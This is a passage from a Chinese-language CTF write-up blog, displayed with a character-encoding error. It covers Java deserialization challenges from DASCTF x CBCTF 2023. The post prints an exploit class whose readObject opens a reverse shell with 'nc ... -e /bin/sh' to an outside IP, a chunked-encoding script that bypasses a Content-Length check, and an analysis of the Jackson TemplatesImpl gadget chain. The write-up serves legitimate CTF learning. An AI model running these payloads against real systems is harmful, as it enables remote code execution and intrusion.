<p>æ­£å¥½å‰é¢é€šè¿‡ env æ³„éœ²å¾—çŸ¥ java_home çš„ä½ç½®</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102103809.png" alt="å¾®ä¿¡æˆªå›¾_20231102103809"></p>
<p>ä»€ä¹ˆï¼Œä½ ä¸çŸ¥é“ java_home äº‹å¹²å˜›çš„ï¼Ÿ</p>
<p>æ¥ï¼Œè·ŸğŸ‘´ä¸€èµ·å¿µ:</p>
<p><code>JAVA_HOME</code>  æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡ç¤º Java å¼€å‘å·¥å…·å’Œåº”ç”¨ç¨‹åºåœ¨è®¡ç®—æœºä¸Šçš„å®‰è£…ä½ç½®ã€‚å®ƒä¸»è¦ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ä½œç”¨ï¼š</p>
<ol>
<li><strong>Java å¼€å‘å·¥å…·çš„å®šä½</strong>ï¼š <code>JAVA_HOME</code>  å˜é‡å‘Šè¯‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå’Œå…¶ä»–å¼€å‘å·¥å…· Java å¼€å‘å·¥å…·çš„å®‰è£…ä½ç½®ã€‚è¿™å¯¹äºç¼–è¯‘ã€è¿è¡Œå’Œè°ƒè¯• Java ç¨‹åºéå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œå½“ä½ ä½¿ç”¨ Java ç¼–è¯‘å™¨ ( <code>javac</code> ) ç¼–è¯‘ Java ä»£ç æ—¶ï¼Œç³»ç»Ÿéœ€è¦çŸ¥é“  <code>JAVA_HOME</code>  çš„ä½ç½®ä»¥æ‰¾åˆ°  <code>javac</code>  å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li><strong>Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„å®šä½</strong>ï¼šé™¤äº†å¼€å‘å·¥å…·ï¼Œ <code>JAVA_HOME</code>  ä¹Ÿå¯ä»¥ç”¨äºå®šä½ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„ä½ç½®ã€‚JRE åŒ…å«äº†è¿è¡Œ Java åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç±»åº“å’Œè¿è¡Œæ—¶ç»„ä»¶ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰å¤šä¸ªä¸åŒç‰ˆæœ¬çš„ Java å®‰è£…ï¼Œè®¾ç½®  <code>JAVA_HOME</code>  å¯ä»¥ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„ Java ç‰ˆæœ¬ã€‚</li>
<li><strong>åº”ç”¨ç¨‹åºçš„å®šä½</strong>ï¼šæŸäº› Java åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çŸ¥é“ Java çš„å®‰è£…ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®é…ç½®è‡ªå·±ã€‚é€šè¿‡è®¾ç½®  <code>JAVA_HOME</code>  ç¯å¢ƒå˜é‡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥è½»æ¾æ‰¾åˆ°æ‰€éœ€çš„ Java è¿è¡Œæ—¶ç¯å¢ƒã€‚</li>
<li><strong>å¼€å‘å·¥å…·å’Œæ„å»ºå·¥å…·çš„é…ç½®</strong>ï¼šè®¸å¤š Java é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚ Maven å’Œ Gradleï¼‰ä½¿ç”¨  <code>JAVA_HOME</code>  å˜é‡æ¥é…ç½®å…¶å†…éƒ¨ä½¿ç”¨çš„ Java ç¯å¢ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿é¡¹ç›®åœ¨æ­£ç¡®çš„ Java ç‰ˆæœ¬ä¸‹ç¼–è¯‘å’Œè¿è¡Œã€‚</li>
<li><strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼šé€šè¿‡ä½¿ç”¨  <code>JAVA_HOME</code>  å˜é‡ï¼Œå¯ä»¥ä½¿ Java å¼€å‘ç¯å¢ƒåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ›´å…·å¯ç§»æ¤æ€§ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šä½¿ç”¨ç›¸åŒçš„  <code>JAVA_HOME</code>  å˜é‡æ¥è¿è¡Œä»£ç ã€‚</li>
</ol>
<p>æ€»ä¹‹ï¼Œ <code>JAVA_HOME</code>  æ˜¯ä¸€ä¸ªå…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œç”¨äºç¡®ä¿è®¡ç®—æœºä¸Šçš„ Java å¼€å‘å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒèƒ½å¤Ÿæ­£ç¡®åœ°æ‰¾åˆ°å’Œä½¿ç”¨ Java å®‰è£…ã€‚å®ƒåœ¨ Java å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­èµ·åˆ°é‡è¦ä½œç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šç‰ˆæœ¬ Java å®‰è£…å’Œè·¨å¹³å°å¼€å‘çš„æƒ…å†µä¸‹ã€‚</p>
<p>ä¸è¯´äººè¯å°±æ˜¯è¿™æ ·ï¼Œè¿™æ˜¯ä¼Ÿå¤§çš„ ChatGPT è¯´çš„ï¼ŒğŸ‘´ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯ï¼Œè¿è¡Œè„šæœ¬çš„ä½ç½®åœ¨é‚£ï¼Œè¦è¿è¡Œçš„ class ä¹Ÿåœ¨é‚£ï¼Œæ‰€ä»¥æœ‰å•¥ class æ”¾é‚£ï¼Œä»–å°±èƒ½åŠ è½½å•¥ class.</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥è¦å¹²å•¥æ‡‚äº†æ²¡ï¼Œä¸Šä¼ ç‚¹å…·æœ‰æ”»å‡»æ€§çš„ class åˆ° javahome é‡Œé¢ï¼Œç‹ ç‹ åœ°å…¥å®ƒä¸€æ³¢.</p>
<p>è€Œä¸”ä¸æ˜¯æœ‰ååºåˆ—åŒ–å—ï¼Œåˆ°è¿™ä½ ä¸å¯èƒ½è¿˜ä¸çŸ¥é“å§ï¼Œåˆ›é€ ä¸€ä¸ªååºåˆ—åŒ–å¸¦æœ‰ç›´æ¥æ¶æ„æ“ä½œçš„ç±»ï¼Œç›´æ¥ getshellğŸ˜Š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InterruptedException, IOException, ClassNotFoundException {</span><br><span class="line"></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"nc"</span>,<span class="string">"43.143.192.19"</span>,<span class="string">"1145"</span>,<span class="string">"-e"</span>,<span class="string">"/bin/sh"</span>});</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(p.exitValue()!=<span class="number">0</span>){</span><br><span class="line">        }</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((s=reader.readLine())!=<span class="literal">null</span>){</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>å†™ä¸ª exp ç±»ï¼Œç¼–è¯‘å¥½åå†ä¸Šä¼ ï¼Œåˆ«ç›´æ¥ sb åˆ°æŠŠ java ä¸Šä¼ äº†</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102150011.png" alt="å¾®ä¿¡æˆªå›¾_20231102150011"></p>
<p>ä½†æ˜¯ğŸ‘´ä¸å¤ªé«˜å…´ï¼Œå› ä¸ºæœ‰ç‚¹ bug, ç¬¬ä¸€æ¬¡æ­ docker æ‰“ä¸æˆï¼Œç¬¬äºŒæ¬¡ç»ˆå‡ºäº†ğŸ˜’.</p>
<h1 id="dasctfxcbctf_2023_bypassjava"><a class="markdownIt-Anchor" href="#dasctfxcbctf_2023_bypassjava">#</a> DASCTFXCBCTF_2023_bypassJava</h1>
<p>çœŸ tm æ¶å¿ƒçš„ java é¢˜ï¼Œä¸ä»…æœ‰ç»•è¿‡ï¼Œè¿˜ tm æœ‰ RASP è¿™ç§æŠ½è±¡çš„ä¸œè¥¿ï¼ŒğŸ‘´å¤ªå¼±äº†ï¼ŒğŸ‘´è¦å­¦.</p>
<p>é¢˜ç›®ç¯å¢ƒç”šè‡³ä¸æ˜¯é¶æœºï¼Œè€Œæ˜¯é™æ€èµ„æºï¼Œå¾ˆä¸çˆ½.</p>
<p>è¿˜å¥½å‡ºé¢˜äººå¼€æºäº†:<a target="_blank" rel="noopener" href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">pankass/DASCTF_X_CBCTF2023_bypassJava: é¢˜ç›®æºç å’Œ docker ç¯å¢ƒ (github.com)</a></p>
<h2 id="content-length-é™åˆ¶"><a class="markdownIt-Anchor" href="#content-lengthé™åˆ¶">#</a> Content-Length é™åˆ¶</h2>
<p>ä¸å¤šè¯´ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ° jackson é“¾å­ï¼Œä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102154201.png" alt="å¾®ä¿¡æˆªå›¾_20231102154201"></p>
<p>è¿™é•¿åº¦é™åˆ¶æ˜¯äººèƒ½æƒ³å‡ºæ¥çš„å—ğŸ˜“,nm ç¨å¾®å¤§ä¸€ç‚¹ï¼Œéšä¾¿ä¸éƒ½å¾—å‡ åƒï¼Ÿ</p>
<p>è¿‡ä¸äº†ï¼Œæ ¹æœ¬è¿‡ä¸äº†ï¼Œè®©æˆ‘çœ‹çœ‹ bypass æ€ä¹ˆä¸ªäº‹:<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102155013.png" alt="å¾®ä¿¡æˆªå›¾_20231102155013"></p>
<p>è¿™é‡Œå¦‚æœå¤´éƒ¨æœ‰ transfer-encoding, å°±ä¼šè¿› <code>addInputFilter</code></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160618.png" alt="å¾®ä¿¡æˆªå›¾_20231102160618"></p>
<p>è¿™é‡Œé¢å¦‚æœæœ‰ chunked, é‚£ä¹ˆå°±ä¼šè®¾ç½®æˆ <code>this.contentDelimitation</code>  ä¸º true</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160810.png" alt="å¾®ä¿¡æˆªå›¾_20231102160810"></p>
<p>æœ€åè¿™é‡Œå°±ä¼šè¿›å…¥ if, ä»è€Œè®¾ç½® ContentLength ä¸º - 1, ç»•è¿‡é•¿åº¦é™åˆ¶.</p>
<h2 id="chuncked-ç¼–ç æ€ä¹ˆå‘"><a class="markdownIt-Anchor" href="#chunckedç¼–ç æ€ä¹ˆå‘">#</a> chuncked ç¼–ç æ€ä¹ˆå‘</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xuehaoyue/p/6639029.html">åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰ - å¦™éŸ³å¤©å¥³ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç®€å•çœ‹ä¸€ä¸‹ä»¬å¤§æ¦‚å°±æ˜¯</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åå…­è¿›åˆ¶é•¿åº¦/r/n</span><br><span class="line"> content/r/n</span><br><span class="line">  ....  </span><br><span class="line">    </span><br><span class="line"><span class="number">0</span>/r/n</span><br><span class="line"> /r/n</span><br></pre></td></tr></tbody></table></figure>
<p>æ¯ä¸€å—éƒ½æ˜¯ <code>åå…­è¿›åˆ¶è¡¨ç¤ºé•¿åº¦</code> ç„¶åï¼Œ <code>/r/n</code></p>
<p>æ¥ç€è¾“å…¥ content, ç„¶å <code>/r/n</code></p>
<p>æœ€åä¸€å—ä¸€å®šè¦è¾“å…¥ <code>0/r/n/r/n</code></p>
<p>ğŸ‘´æµ…æµ…å†™ä¸ªè„šæœ¬</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">"http://127.0.0.1:8080/read"</span></span><br><span class="line">content = open(<span class="string">"data.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">leng = hex(len(content)).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">body = leng+<span class="string">"\r\n"</span>+content+<span class="string">"\r\n0\r\n\r\n"</span></span><br><span class="line">print(body)</span><br><span class="line"></span><br><span class="line">headers= {<span class="string">"transfer-encoding"</span>:<span class="string">"chunked"</span>}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=body,headers=headers)</span><br></pre></td></tr></tbody></table></figure>
<p>soeasy,ğŸ¤£,</p>
<p>ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ï¼ŒğŸ‘´ç°åœºç”šè‡³ç¬¬ä¸€æ­¥éƒ½æ²¡è¿‡å».</p>
<h2 id="ä¸ç¨³å®š-jackson-é“¾é—®é¢˜"><a class="markdownIt-Anchor" href="#ä¸ç¨³å®šjacksoné“¾é—®é¢˜">#</a> ä¸ç¨³å®š jackson é“¾é—®é¢˜</h2>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">å…³äº java ååºåˆ—åŒ–ä¸­ jackson é“¾å­ä¸ç¨³å®šé—®é¢˜ (pankas.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12846">ä» JSON1 é“¾ä¸­å­¦ä¹ å¤„ç† JACKSON é“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>ğŸ‘´ctmd æ‰“ jackson é“¾å­çš„æ—¶å€™ï¼Œæœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡é‡è§äº†é™Œç”Ÿçš„æŠ¥é”™</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[<span class="string">"stylesheetDOM"</span>])</span><br></pre></td></tr></tbody></table></figure>
<p>ä¸”ç»è¿‡æœ¬åœ°è°ƒè¯•ï¼Œä¼¼ä¹è¿›å…¥äº†é™Œç”Ÿçš„ä»£ç æ®µï¼ŒğŸ‘´å¾ˆä¸ä¹æ„.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103150351.png" alt="å¾®ä¿¡æˆªå›¾_20231103150351"></p>
<p>å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨è°ƒç”¨ getters çš„æ—¶å€™ï¼Œä¼˜å…ˆå¥äº† <code>getStylesheetDOM</code>  è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ˜¯ä¸ä¼šå»è®¾ç½®è¿™ä¸ªå€¼çš„ï¼Œæ‰€ä»¥ç†æ‰€åº”å½“çš„ï¼Œnmd ç©ºæŒ‡é’ˆäº†.ğŸ˜“ğŸ˜…è€Œå½“å…¶è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼˜å…ˆè°ƒç”¨  <code>getOutputProperties</code>  æ–¹æ³•æ—¶æ‰æ˜¯æˆ‘ä»¬æ­£å¸¸æƒ³è¦çš„ç»“æœã€‚</p>
<p>è¿™ nm çœŸæœ‰å‘å•Šï¼Œæ¯”èµ›æƒ³æ‰“è¿™æ¡é“¾å­ï¼Œä¸è¯´ ban ä½é—®é¢˜ï¼Œnmd è¿™é—®é¢˜ä¹Ÿåªèƒ½é€šè¿‡ä¸åœåœ°é‡ç½®é¶æœºè§£å†³äº†ï¼Œæ¯”èµ›ä½ é‡ç½®é¶æœºï¼Œé™æ€åœ°å€ç­‰ä¼¼å§.</p>
<p>ç°åœ¨ğŸ‘´æ¥åˆ†æä¸€ä¸‹æ€ä¹ˆä¸ªäº‹ï¼Œä¼˜åŒ–ä¸€ä¸‹</p>
<h3 id="æµç¨‹"><a class="markdownIt-Anchor" href="#æµç¨‹">#</a> æµç¨‹</h3>
<p>è¿™æ¡é“¾å­åˆ†æğŸ‘´ä¸æƒ³è¯´äº†ï¼Œé—­ç€çœ¼ç›éƒ½çŸ¥é“æ€ä¹ˆä¸ªäº‹.</p>
<p>å…³é”®æ˜¯è§¦å‘ <code>POJONode</code>  çš„ <code>toString</code>  æ–¹æ³•ï¼Œç„¶åå†…éƒ¨ç»è¿‡ä¸€ç³»åˆ—åºåˆ—åŒ–å™¨è°ƒç”¨  <code>POJONode</code>  ä¸­å°çš„  <code>_value</code>  å±æ€§çš„ getter æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨  <code>TemplatesImpl</code>  ç±»å‹å¯¹è±¡çš„  <code>getOutputProperties</code>  æ–¹æ³•ä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>é‡ç‚¹å°±æ˜¯ä» <code>toString</code>  åˆ° <code>getters</code>  çš„è°ƒç”¨è¿™ä¸€è¿‡ç¨‹</p>
<p>æ ˆè°ƒè¯•æ”¾åœ¨è¿™:</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>åœ¨  <code>com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField</code>  æ–¹æ³•ä¸­åˆ©ç”¨åå°„æ¥æ‰§è¡Œå…¶  <code>getters</code>  æ–¹æ³•</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152329.png" alt="å¾®ä¿¡æˆªå›¾_20231103152329"></p>
<p>è¿™æ¬¡å°±è°ƒç”¨äº† getoutputProperties, å¾ˆå¥½ï¼ŒğŸ‘´å–œæ¬¢ğŸ¤ª</p>
<p>é‚£å°±å¾€å‰çœ‹çœ‹å“ªé‡Œè·å–äº† <code>getters</code></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152702.png" alt="å¾®ä¿¡æˆªå›¾_20231103152702"></p>
<p>åœ¨ <code>com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields</code>  ä¸­ï¼Œ <code>prop</code>  æ•°ç»„å­˜å‚¨äº† <code>getters</code> , é€šè¿‡å¾ªç¯éå†æ‰€æœ‰ <code>getters</code>  å¹¶è°ƒç”¨ <code>serializeAsField</code></p>
<p>è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡ï¼Œä» <code>	_props</code>  è·å¾—</p>
<p>æœ€ç»ˆåœ¨ <code>com.fasterxml.jackson.databind.introspect</code>  èµ‹å€¼</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">collectAll:<span class="number">418</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getJsonValueAccessor:<span class="number">270</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findJsonValueAccessor:<span class="number">258</span>, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findSerializerByAnnotations:<span class="number">391</span>, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createSerializer2:<span class="number">224</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">createSerializer:<span class="number">173</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createUntypedSerializer:<span class="number">1495</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">_createAndCacheUntypedSerializer:<span class="number">1443</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findValueSerializer:<span class="number">544</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findTypedValueSerializer:<span class="number">822</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103220943.png" alt="å¾®ä¿¡æˆªå›¾_20231103220943"></p>
<p>è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡å†³å®š <code>getters</code>  é¡ºåº</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231104081525.png" alt="å¾®ä¿¡æˆªå›¾_20231104081525"></p>
<p>éšåé€šè¿‡ <code>getDeclaredMethods</code>  è·å–æ–¹æ³•ï¼Œé‚£è¿™é‡Œè·å–æ–¹æ³•çš„é¡ºåºæ˜¯ä¸å›ºå®šçš„ã€‚</p>
<p>å¹¶ä¸”ï¼Œåœ¨ <code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer</code>  æ–¹æ³•é‡Œï¼Œä¼šå°†è·å–çš„æ–¹æ³•é¡ºåºè¿›è¡Œç¼“å­˜ï¼Œä¹‹å‰æåˆ°è¿‡äº†ï¼Œç¼“å­˜åä¼šè¿›å…¥å…¶å®ƒ ifã€‚</p>
<p>å› æ­¤ç¬¬ä¸€æ¬¡æ‰“ä¸é€šï¼Œä¹‹åä¹Ÿæ— æ³•æ‰“é€šäº†</p>
<h3 id="ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š"><a class="markdownIt-Anchor" href="#ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š">#</a> ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š</h3>
<p>è·å–é¡ºåºæ˜¯æ ¹æ®åœ°å€çš„å¤§å°æ¥æ’åºçš„ï¼ŒæœŸé—´å­˜åœ¨å†…å­˜ free çš„åŠ¨ä½œï¼Œé‚£åœ°å€æ˜¯ä¸ä¼šä¸€ç›´çº¿æ€§å˜åŒ–çš„ï¼Œä¹‹æ‰€ä»¥ä¸æŒ‰ç…§å­—æ¯æ’åºï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†é€Ÿåº¦è€ƒè™‘ï¼Œæ ¹æ®åœ°å€æ’åºæ˜¯æœ€å¿«çš„ã€‚</p>
